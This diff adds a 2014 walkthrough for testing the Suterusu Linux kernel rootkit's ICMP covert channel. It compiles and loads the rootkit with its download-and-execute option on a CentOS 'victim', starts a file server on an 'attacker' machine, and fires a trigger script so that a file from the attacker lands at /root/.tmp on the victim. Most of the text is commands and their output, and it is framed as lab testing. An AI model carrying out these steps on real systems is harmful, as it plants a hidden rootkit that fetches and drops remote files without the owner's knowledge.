@@ -1,0 +1,68 @@
+Shawn the R0ck - Aug 18 2014
+-----------------------------------------------------------------
+
+This is a simple ICMP covert channel testing example! Suterusu has
+already implemented it!
+
+1. Download the Suterusu for both "victim" and "attacker".
+
+2. The victim is using CentOS 6.5:
+
+root@centos-rktesting ~]# uname -r
+2.6.32-431.el6.x86_64
+
+
+2.1 Install some necessary packages:
+
+yum install -y kernel-devel.x86_64 gcc vim
+
+
+2.2 Compile & load the rootkit:
+
+[root@centos-rktesting suterusu]# make linux-x86_64 KDIR=/usr/src/kernels/2.6.32-431.23.3.el6.x86_64/ ICMP=y DLEXEC=y
+make ARCH=x86_64 EXTRA_CFLAGS="-D_CONFIG_X86_64_ -D_CONFIG_DLEXEC_ -D_CONFIG_ICMP_" -C /usr/src/kernels/2.6.32-431.23.3.el6.x86_64/ M=/root/suterusu modules
+make[1]: Entering directory `/usr/src/kernels/2.6.32-431.23.3.el6.x86_64'
+  CC [M]  /root/suterusu/main.o
+  CC [M]  /root/suterusu/util.o
+  CC [M]  /root/suterusu/module.o
+  CC [M]  /root/suterusu/dlexec.o
+  CC [M]  /root/suterusu/icmp.o
+  LD [M]  /root/suterusu/suterusu.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /root/suterusu/suterusu.mod.o
+  LD [M]  /root/suterusu/suterusu.ko.unsigned
+  NO SIGN [M] /root/suterusu/suterusu.ko
+make[1]: Leaving directory `/usr/src/kernels/2.6.32-431.23.3.el6.x86_64'
+
+
+2.3 Load the rootkit:
+
+[root@centos-rktesting suterusu]# insmod suterusu.ko
+ 
+
+3. The attacker can use anything GNU/Linux distro as you want, compile
+the file server and designate the file you want it to be transferred:
+
+shawn@shawn-fortress /tmp/suterusu $ sudo ./a.out 8556 README.md
+Bound to port 8556, waiting for connection...
+
+
+3.1 Open a new terminal:
+
+shawn@shawn-fortress /tmp/suterusu $ cd test/
+shawn@shawn-fortress /tmp/suterusu/test $ ls
+trigger_icmp_covert.py
+shawn@shawn-fortress /tmp/suterusu/test $ ./trigger_icmp_covert.py
+
+
+ 4. Go to the victim's machine, check:
+[root@centos-rktesting ~]# cat /root/.tmp
+Suterusu
+========
+
+Typical compilation steps:
+...........................................................
+.................................................................
+
+---------------------------------------------------------------------
